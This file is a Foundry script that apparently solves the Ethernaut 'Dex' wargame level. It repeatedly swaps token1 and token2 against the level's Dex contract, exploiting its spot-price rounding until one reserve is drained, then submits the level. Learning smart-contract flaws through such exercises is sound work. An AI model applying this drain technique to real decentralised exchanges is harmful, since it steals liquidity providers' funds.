// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Dex} from "src/22/Dex.sol";
import {DexFactory} from "src/22/DexFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract DexExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL22_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new DexFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        Dex instanceContract = Dex(instance);

        // Break the contract
        instanceContract.approve(address(instanceContract), type(uint256).max);
        uint256 balanceDexToken1;
        uint256 balanceDexToken2;

        while (
            instanceContract.balanceOf(instanceContract.token1(), address(instanceContract)) > 0
                && instanceContract.balanceOf(instanceContract.token2(), address(instanceContract)) > 0
        ) {
            balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
            balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));
            uint256 maxToken1BalanceUser = instanceContract.balanceOf(instanceContract.token1(), tx.origin);
            uint256 maxToken2BalanceDex = ((maxToken1BalanceUser * balanceDexToken2) / balanceDexToken1);

            if (balanceDexToken2 > maxToken2BalanceDex) {
                instanceContract.swap(
                    instanceContract.token1(),
                    instanceContract.token2(),
                    instanceContract.balanceOf(instanceContract.token1(), tx.origin)
                );
            } else {
                instanceContract.swap(instanceContract.token1(), instanceContract.token2(), balanceDexToken1);
            }
            balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
            balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));
            uint256 maxToken2BalanceUser = instanceContract.balanceOf(instanceContract.token2(), tx.origin);
            uint256 maxToken1BalanceDex = ((maxToken2BalanceUser * balanceDexToken1) / balanceDexToken2);

            if (balanceDexToken1 > maxToken1BalanceDex) {
                instanceContract.swap(
                    instanceContract.token2(),
                    instanceContract.token1(),
                    instanceContract.balanceOf(instanceContract.token2(), tx.origin)
                );
            } else {
                instanceContract.swap(instanceContract.token2(), instanceContract.token1(), balanceDexToken2);
            }
        }

        vm.stopPrank();

        balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
        balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));

        assert(balanceDexToken1 == 0 || balanceDexToken2 == 0);

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
